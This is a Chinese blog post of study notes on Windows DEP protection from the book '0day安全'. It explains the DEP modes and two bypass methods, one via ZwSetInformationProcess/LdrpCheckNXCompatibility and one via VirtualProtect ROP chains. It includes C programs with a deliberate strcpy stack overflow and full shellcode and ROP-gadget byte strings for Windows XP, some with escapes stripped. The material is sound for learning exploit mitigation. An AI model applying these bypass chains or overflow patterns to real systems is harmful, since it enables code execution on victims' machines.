---
layout: post
title:  "《0day安全》DEP保护"
date:   2019-3-29
categories: 
excerpt: 
---

# **DEP介绍**

DEP（Data Execution
Prevention）的基本原理是将数据所在的内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常。

![](<http://ww1.sinaimg.cn/large/7fb67c86gy1g1g4ozusakj20k708vadp.jpg>)

所以DEP的主要作用就是阻止数据页（如默认的堆页、各种堆栈页以及内存池页）执行代码，根据实现的机制分为软件DEP和硬件DEP。

软件DEP就是SafeSEH，它的目的是阻止利用S.E.H的攻击，所以在SafeSEH的校验过程中会检查异常处理函数是否位于非可执行页。

硬件DEP才是真正意义的DEP，硬件DEP需要CPU的支持。

## **DEP原理**

操作系统通过设置内存页的NX/XD属性标记，来指明不能从该内存执行代码。当该标识位设置为0里表示这个页面允许执行指令，设置为1时表示不允许。

根据启动参数的不同，DEP工作状态可以分为四种。

1.  Option：默认仅将DEP保护应用于Windows系统组件和服务，对其他程序不予保护，这种状态可以被应用动态关闭。多用于普通用户版的操作系统。

2.  Optout：为排除列表程序外的所有程序和服务启用DEP，用户可以手动在排除列表中指定不启用DEP保护的程序和服务。这种状态可以被应用动态关闭。多用于服务器版的操作系统。

3.  AlwaysOn：对所有进程启用DEP保护，不存在排序列表，这种模式下，DEP不可以被关闭，目前只有在64位的操作系统上才工作在AlwaysOn。

4.  AlwaysOff：对所有进程都禁用DEP，这种模式下，DEP也不能被动态开启，这种模式一般只有在某种特定场合才会使用，如DEP干扰到进程的正常运行。

# **DEP的局限**

1.  硬件DEP需要CPU的支持，但并不是所有CPU都提供DEP的支持。

2.  由于兼容性的原因Windows不能对所有进程开启DEP保护，否则可能会出现异常。例如第三方的插件DLL，由于无法确认其是否支持DEP，对涉及这些DLL的程序不敢贸然开启DEP保护。

3.  /NXCOMPAT编译选项只对Windows Vista以上的系统有效。

4.  在DEP工作在最主要的两个状态Option和Optout下，DEP可以被动态关闭和开启的，这说明操作系统提供某些API函数来控制DEP的状态，而且早期的操作系统对这些API的调用没有任何限制，所有进程都可以调用这些API。

# **DEP突破**

## **攻击未启用DEP的程序**

因为兼容性的问题，不是所有的进程都开启DEP，所以我们可以攻击那些没有启用DEP的程序来达到目的。

## **利用Ret2Libc挑战DEP**

Ret2Libc时Return-to-libc简写，由于DEP不允许我们直接到非可执行页执行指令，我们就需要在其他可执行的位置找到符合我们要求的指令，然后这条指令还需要一个返回指令来收回程序的控制权。相当于就是构造一个ROP（Return-oriented
Programming）链。

![](<http://ww1.sinaimg.cn/large/7fb67c86gy1g1get6bhgjj20ey0ai0w9.jpg>)

### **利用ZwSetInformationProcess**

一个进程的DEP设置保存在KPROCESS结构中的_KEXECUTE_OPTIONS上，而这个标识可以通过API函数ZwQueryInfomationProcess和ZwSetInformationProcess进行查询和修改。

_KEXECUTE_OPTIONS的结构

![](<http://ww1.sinaimg.cn/large/7fb67c86gy1g1ggaoi0faj209f04s75r.jpg>)

这里只有前四个bit与DEP有关，第一个置为1则DEP开启，第二个置1则关闭。所以我们只要将_KEXECUTE_OPTIONS的值设为0x02(00000010)就可以关闭DEP。

![](<http://ww1.sinaimg.cn/large/7fb67c86gy1g1gghs8oq1j20do0350u8.jpg>)

这个是我们能控制的API

第一个参数为进程的句柄，设置为−1 的时候表示为当前进程

第二个参数为信息类 —– 0x22

第三个参数可以用来设置_KEXECUTE_OPTIONS   —- 0x2

第四个参数为第三个参数的长度 — 0x4

可以看到这样子的传参有个棘手的0x00

但是微软的兼容性惹祸了，如果一个进程的Permanent位没有设置，当它加载dll，并对其进行DEP兼容性检查，当兼容性存在问题，就会当存在兼容性问题时进程的DEP
就会被关闭。

为此微软设立了LdrpCheckNXCompatibility函数，当符合以下条件之一时进程的DEP
会被关闭： 

1.  当DLL 受SafeDisc 版权保护系统保护时；

2.  当DLL 包含有.aspcak、.pcle、.sforce 等字节时；

3.  Windows Vista 下面当DLL
    包含在注册表“HKEY_LOCAL_MACHINESOFTWAREMicrosoft Windows
    NTCurrentVersionImage File Execution
    OptionsDllNXOptions”键下边标识出不需要启动DEP 的模块时。

下面的是Windows XP
SP3下LdrpCheckNXCompatibility关闭DEP的流程，以SafeDisc作为例子。

![](<http://ww1.sinaimg.cn/large/7fb67c86gy1g1ggzm1d4wj20kt0ayn0q.jpg>)

下面以作者给的代码作为例子。

	#include <stdlib.h>

	#include <string.h>

	#include <stdio.h>

	#include <windows.h>

	char shellcode[]=

	"xFCx68x6Ax0Ax38x1Ex68x63x89xD1x4Fx68x32x74x91x0C"

	"x8BxF4x8Dx7ExF4x33xDBxB7x04x2BxE3x66xBBx33x32x53"

	"x68x75x73x65x72x54x33xD2x64x8Bx5Ax30x8Bx4Bx0Cx8B"

	"x49x1Cx8Bx09x8Bx69x08xADx3Dx6Ax0Ax38x1Ex75x05x95"

	"xFFx57xF8x95x60x8Bx45x3Cx8Bx4Cx05x78x03xCDx8Bx59"

	"x20x03xDDx33xFFx47x8Bx34xBBx03xF5x99x0FxBEx06x3A"

	"xC4x74x08xC1xCAx07x03xD0x46xEBxF1x3Bx54x24x1Cx75"

	"xE4x8Bx59x24x03xDDx66x8Bx3Cx7Bx8Bx59x1Cx03xDDx03"

	"x2CxBBx95x5FxABx57x61x3Dx6Ax0Ax38x1Ex75xA9x33xDB"

	"x53x68x77x65x73x74x68x66x61x69x6Cx8BxC4x53x50x50"

	"x53xFFx57xFCx53xFFx57xF8x90x90x90x90x90x90x90x90"

	;

	void test()

	{

		char tt[176];

		strcpy(tt,shellcode);

	}

	int main()

	{

		HINSTANCE hInst = LoadLibrary("shell32.dll");

		char temp[200];

		test();

		return 0;

	}

根据LdrpCheckNXCompatibility关闭DEP的流程，我们需要把al置为1，所以先用插件

![](<http://ww1.sinaimg.cn/large/7fb67c86gy1g1hh337s90j20gj0ayt9d.jpg>)

我们用下面选中的这个，顺便还找到了DEP的地址

![](<http://ww1.sinaimg.cn/large/7fb67c86gy1g1hh4t8y08j20nu0jdabu.jpg>)

计算好覆盖的位置，我们创建的是176个字节的数组，所以shellcode+x90凑够176个字节，接下来就是用上面的置1覆盖，接着放关闭DEP的地址。

	char shellcode[]=

	"xFCx68x6Ax0Ax38x1Ex68x63x89xD1x4Fx68x32x74x91x0C"

	"x8BxF4x8Dx7ExF4x33xDBxB7x04x2BxE3x66xBBx33x32x53"

	"x68x75x73x65x72x54x33xD2x64x8Bx5Ax30x8Bx4Bx0Cx8B"

	"x49x1Cx8Bx09x8Bx69x08xADx3Dx6Ax0Ax38x1Ex75x05x95"

	"xFFx57xF8x95x60x8Bx45x3Cx8Bx4Cx05x78x03xCDx8Bx59"

	"x20x03xDDx33xFFx47x8Bx34xBBx03xF5x99x0FxBEx06x3A"

	"xC4x74x08xC1xCAx07x03xD0x46xEBxF1x3Bx54x24x1Cx75"

	"xE4x8Bx59x24x03xDDx66x8Bx3Cx7Bx8Bx59x1Cx03xDDx03"

	"x2CxBBx95x5FxABx57x61x3Dx6Ax0Ax38x1Ex75xA9x33xDB"

	"x53x68x77x65x73x74x68x66x61x69x6Cx8BxC4x53x50x50"

	"x53xFFx57xFCx53xFFx57xF8x90x90x90x90x90x90x90x90"

	"xA0xC1x80x7C"

	"x24xbex93x7c"

调试

![](<http://ww1.sinaimg.cn/large/7fb67c86gy1g1hhg56deuj21100lutaz.jpg>)

发现我们已经成功的把retn的位置覆盖成我们需要的地址。我们继续往下走，我们可以看到这里的EBP-4已经成功覆盖成0x2（00000010）了，接下来我们就可以关闭DEP。

![](<http://ww1.sinaimg.cn/large/7fb67c86gy1g1hhhlu66lj210h0n3q5j.jpg>)

但我们发现这里程序返回到了一个我们无法控制的地方。

![](<http://ww1.sinaimg.cn/large/7fb67c86gy1g1hhjka7bjj211d0n2ju1.jpg>)

这让我们无法继续执行shellcode，所以我们需要在关闭DEP之后重新返回到我们能控制的位置。（这里需要提的一点是在原书上作者在这里碰到了写入异常的问题，所以在前面就进行了对栈的调整，但我这里没有遇到这个问题，所以这里前面并没有对栈进行调整，虽然后面还是用到了这一步，但我考虑的和原作者不同。）

![](<http://ww1.sinaimg.cn/large/7fb67c86ly1g1hjfirwzlj20fi06474l.jpg>)

我们可以发现在关闭DEP函数的最后有一个leave，这个指令的意思等同于

mov esp,ebp和pop ebp

所以我们可以提前把ebp的值固定在我们需要的位置，并且之后不对ebp有操作，再在retn的位置覆盖为一个jmp那么我们就可以在经过leave之后的retn返回到我们需要的位置。寻找修改ebp的指令还是和上面的一样插件

![](<http://ww1.sinaimg.cn/large/7fb67c86ly1g1hjpush39j20mg0a53zc.jpg>)

因为levea还有一个pop ebp，所以我们还是把jmp到esp比较稳妥，jmp
esp的指令用这个插件的另一个选项找

![](<http://ww1.sinaimg.cn/large/7fb67c86ly1g1hkdwbbj5j20fz0ckjrw.jpg>)

我们用这个

![](<http://ww1.sinaimg.cn/large/7fb67c86ly1g1hkeu9bzqj20mz0faabg.jpg>)

我们将shellcode改成这样

	char shellcode[]=

	"xFCx68x6Ax0Ax38x1Ex68x63x89xD1x4Fx68x32x74x91x0C"

	"x8BxF4x8Dx7ExF4x33xDBxB7x04x2BxE3x66xBBx33x32x53"

	"x68x75x73x65x72x54x33xD2x64x8Bx5Ax30x8Bx4Bx0Cx8B"

	"x49x1Cx8Bx09x8Bx69x08xADx3Dx6Ax0Ax38x1Ex75x05x95"

	"xFFx57xF8x95x60x8Bx45x3Cx8Bx4Cx05x78x03xCDx8Bx59"

	"x20x03xDDx33xFFx47x8Bx34xBBx03xF5x99x0FxBEx06x3A"

	"xC4x74x08xC1xCAx07x03xD0x46xEBxF1x3Bx54x24x1Cx75"

	"xE4x8Bx59x24x03xDDx66x8Bx3Cx7Bx8Bx59x1Cx03xDDx03"

	"x2CxBBx95x5FxABx57x61x3Dx6Ax0Ax38x1Ex75xA9x33xDB"

	"x53x68x77x65x73x74x68x66x61x69x6Cx8BxC4x53x50x50"

	"x53xFFx57xFCx53xFFx57xF8x90x90x90x90x90x90x90x90"

	"xA0xC1x80x7C"//MOV al,1

	"x95x8bx1dx5d"//ebp

	"x87xa7x64x7d"// jmp esp

	"x24xbex93x7c"// DEP

调试的时候我们再观察下retn 4之后，也就是重新定位ebp之后栈空间

![](<http://ww1.sinaimg.cn/large/7fb67c86ly1g1hklo0ax3j20x30m6acl.jpg>)

我们可以发现当前弹出的就是jmp
esp，而我们希望的是在关闭DEP之后再运行到这里，如果我们将jmp放在DEP后面，那么retn+4会跳过一个栈位置到下一个栈位置去，那也无法定位到jmp的位置，而现在这个情况，我们只要在jmp之前再加一行对程序没多大影响的代码就行了，这里用了retn
0x28。

![](<http://ww1.sinaimg.cn/large/7fb67c86ly1g1hkqvv3kyj20et0cigm3.jpg>)

寻找的插件，第一个参数设置0，第二个参数设置0x28。

我们将找到的指令放在jmp前面，再运行。

![](<http://ww1.sinaimg.cn/large/7fb67c86ly1g1hku4nx5xj20xs0me412.jpg>)

我们成功的把DEP关闭并且跳到了esp，接下来只需要在这个位置布置一个jmp跳到shellcode执行就可以了。我们现在在12FF94，shellcode在12FED0

	12FED0-12FF94-5（-5是跳转指令需要的长度）= FFFFFFFF37

	"xe9x37xffxff"// jmp

	"xffx90x90x90"

凑够16个字节。

再运行就可以看到

![](<http://ww1.sinaimg.cn/large/7fb67c86ly1g1hkx835ccj2064052746.jpg>)

完整的shellcode

	char shellcode[]=

	"xFCx68x6Ax0Ax38x1Ex68x63x89xD1x4Fx68x32x74x91x0C"

	"x8BxF4x8Dx7ExF4x33xDBxB7x04x2BxE3x66xBBx33x32x53"

	"x68x75x73x65x72x54x33xD2x64x8Bx5Ax30x8Bx4Bx0Cx8B"

	"x49x1Cx8Bx09x8Bx69x08xADx3Dx6Ax0Ax38x1Ex75x05x95"

	"xFFx57xF8x95x60x8Bx45x3Cx8Bx4Cx05x78x03xCDx8Bx59"

	"x20x03xDDx33xFFx47x8Bx34xBBx03xF5x99x0FxBEx06x3A"

	"xC4x74x08xC1xCAx07x03xD0x46xEBxF1x3Bx54x24x1Cx75"

	"xE4x8Bx59x24x03xDDx66x8Bx3Cx7Bx8Bx59x1Cx03xDDx03"

	"x2CxBBx95x5FxABx57x61x3Dx6Ax0Ax38x1Ex75xA9x33xDB"

	"x53x68x77x65x73x74x68x66x61x69x6Cx8BxC4x53x50x50"

	"x53xFFx57xFCx53xFFx57xF8x90x90x90x90x90x90x90x90"

	"xA0xC1x80x7C"//MOV al,1

	"x95x8bx1dx5d"//ebp

	"x31xf7x80x7c"//retn 0x28

	"x87xa7x64x7d"// jmp esp

	"x24xbex93x7c"// DEP

	"xe9x37xffxff"// jmp

	"xffx90x90x90"

	;

![](<http://ww1.sinaimg.cn/large/7fb67c86ly1g1hllrva6rj20fr0gjab9.jpg>)

这个就是整个程序的跳转流程。

### **利用VirtualProtect**

在Optout和AlwaysON模式下所有进程是默认开启DEP，如果一个程序自身偶尔需要从堆栈中取指令，会发生错误。为了解决这个问题微软提供了修改内存属性的VirtualProtect函数，该函数位于kernel32.dll。

![](<http://ww1.sinaimg.cn/large/7fb67c86ly1g1ii6fiuvxj20l109742u.jpg>)

这是函数的结构以及各个参数的说明。

我们只要将第一个参数设为shellcode的起始地址，第二个参数比shellcode的大小大就行，第三个参数设为0x40，第四个参数为某个可写地址，这样程序运行VirtualProtect之后就会把shellcode这块区域设置为可执行状态。

![](<http://ww1.sinaimg.cn/large/7fb67c86ly1g1iiiqqeyjj20lq0c4goq.jpg>)

代码：

	#include <stdlib.h>

	#include <string.h>

	#include <stdio.h>

	#include <windows.h>

	char shellcode[]=

	"x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"

	"x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"

	"x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"

	"x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"

	"x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"

	"x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"

	"x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"

	"x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"

	"x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"

	"x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"

	"x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90";

	void test()

	{

		char tt[176];

		strcpy(tt,shellcode);

		//memcpy(tt,shellcode,420);

	}

	int main()

	{

		HINSTANCE hInst = LoadLibrary("shell32.dll");

		char temp[200];

		test();

		return 0;

	}

因为strcpy会截断0x00，所以原书作者试验使用的memcpy。

在od里面找到VirtualProtect函数的方法是加载完程序之后

![](<http://ww1.sinaimg.cn/large/7fb67c86ly1g1iiw6v46cj20qh04c3yv.jpg>)

找到kernel32.dll，然后双击进入，ctrl+g输入VirtualProtect就可以找到了

![](<http://ww1.sinaimg.cn/large/7fb67c86ly1g1iix6tr3ej20km081t8w.jpg>)

![](<http://ww1.sinaimg.cn/large/7fb67c86ly1g1jmrx7tuoj20zv0kvgnr.jpg>)

我可以运行到这里看到这里有个mov
ebp,esp然后接着就是几个参数的入栈，所以我们可以在运行到这个函数之前提前到栈布置栈（这里要注意一下，最后VirtualProtect的入口应该从push参数那里进入，而不是从头进入，如果从头进入有一个修改ebp的指令会对前面布置的栈进行破坏）

![](<http://ww1.sinaimg.cn/large/7fb67c86ly1g1jp7fch6jj20dd047wef.jpg>)

![](<http://ww1.sinaimg.cn/large/7fb67c86ly1g1jmu3jfl0j20de01xdfo.jpg>)

作者用了这样一个指令，这个指令寻找的方法是通过机器码来找

![](<http://ww1.sinaimg.cn/large/7fb67c86ly1g1jmuz0sc4j20cm06cdfw.jpg>)

一个块一个块的找，就可以找到了。这里既然有个jmp
eax我们就要提前布置好eax，让它跳到我们想要的位置。

![](<http://ww1.sinaimg.cn/large/7fb67c86ly1g1jmz0oef7j20lo02iglk.jpg>)

首先是让ebp+0x8里存可读写的位置。

![](<http://ww1.sinaimg.cn/large/7fb67c86ly1g1jpok05ufj210o0kvjth.jpg>)

在运行到retn 4后就会到ebp+0x8，所以我们需要再往下走一个位置，那样等push
esp就可以把esp压入到ebp+0x8的位置。一个retn就可以达到目的了

![](<http://ww1.sinaimg.cn/large/7fb67c86ly1g1jps36c5vj20z70ix0ua.jpg>)

![](<http://ww1.sinaimg.cn/large/7fb67c86ly1g1jpsopyspj20z90i3tab.jpg>)

这样我们就完成了对ebp+0x8的修改，接下来就是ebp+0x14的位置，我们现在在ebp+0x8的位置，只要往下再走三个位置就可以到ebp+0x14，所以说我们这里jmp
eax，就要在eax上放3个连续的pop就可以达到目的

![](<http://ww1.sinaimg.cn/large/7fb67c86ly1g1jpxb8h13j21000jydhv.jpg>)

Retn还是返回到push esp的位置。

![](<http://ww1.sinaimg.cn/large/7fb67c86ly1g1jpz1ekswj20y30jqwg2.jpg>)

这样我们就已经完成了VirtualProtect函数四个参数的修改（ebp+0xc和ebp+0x10是直接在溢出布置的，我的电脑不知道为什么不能用memcpy函数，所以只能用strcpy代替，如果用实际需要修改的参数就会被“x00”截断，所以在这里替代一下。）

接下来还是回到eax里的三个pop，所以我们要在后面的第三个位置布置VirtualProtect函数的切入点。

![](<http://ww1.sinaimg.cn/large/7fb67c86ly1g1jq2ez6rlj20zt0ic760.jpg>)

完成修改。

![](<http://ww1.sinaimg.cn/large/7fb67c86ly1g1jq3gayxej20z00kcdho.jpg>)

运行完函数之后我们在12FF98+0xFF这个位置里就突破了DEP保护，接下来就是如何运行shellcode的问题了。

![](<http://ww1.sinaimg.cn/large/7fb67c86ly1g1jq5shwaaj211e0jlmz8.jpg>)

在这里布置一个jmp esp的指令，让它跳到高栈的shellcode执行，因为有一个retn
10所以中间还需要填充20个x90（0x10+4=20）。然后就可以跳转到shellcode位置执行，这里就不演示了，因为没有memcpy所以也算是失败了。

完整的shellcode。

	char shellcode[]=

	"x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"

	"x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"

	"x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"

	"x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"

	"x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"

	"x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"

	"x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"

	"x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"

	"x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"

	"x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"

	"x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"

	"x8dx99x80x7c" //pop eax retn

	"x29x4bx75x7d" //pop pop pop

	"xe5x0bx76x7d" //修复ebp

	"xa7xb3x5cx7d" //retn

	"x90x90x90x90"

	"x5cxdcxebx77" //push esp,jmp eax

	"x90x90x90x90"

	"x90x90x90x90"

	"x5cxdcxebx77" //push esp,jmp eax

	"x90x90x90x90"

	"x90x90x90x90"

	"xd9x1ax80x7c" //funcation

	"x90x90x90x90"

	"x8bx91xd3x7d" //jmp esp

	"x90x90x90x90"

	"x90x90x90x90"

	"x90x90x90x90"

	"x90x90x90x90"

	"xFCx68x6Ax0Ax38x1Ex68x63x89xD1x4Fx68x32x74x91x0C"

	"x8BxF4x8Dx7ExF4x33xDBxB7x04x2BxE3x66xBBx33x32x53"

	"x68x75x73x65x72x54x33xD2x64x8Bx5Ax30x8Bx4Bx0Cx8B"

	"x49x1Cx8Bx09x8Bx69x08xADx3Dx6Ax0Ax38x1Ex75x05x95"

	"xFFx57xF8x95x60x8Bx45x3Cx8Bx4Cx05x78x03xCDx8Bx59"

	"x20x03xDDx33xFFx47x8Bx34xBBx03xF5x99x0FxBEx06x3A"

	"xC4x74x08xC1xCAx07x03xD0x46xEBxF1x3Bx54x24x1Cx75"

	"xE4x8Bx59x24x03xDDx66x8Bx3Cx7Bx8Bx59x1Cx03xDDx03"

	"x2CxBBx95x5FxABx57x61x3Dx6Ax0Ax38x1Ex75xA9x33xDB"

	"x53x68x77x65x73x74x68x66x61x69x6Cx8BxC4x53x50x50"

	"x53xFFx57xFCx53xFFx57xF8"

	;

整体的rop

![](<http://ww1.sinaimg.cn/large/7fb67c86ly1g1jr1gq64fj20r30jzdh5.jpg>)
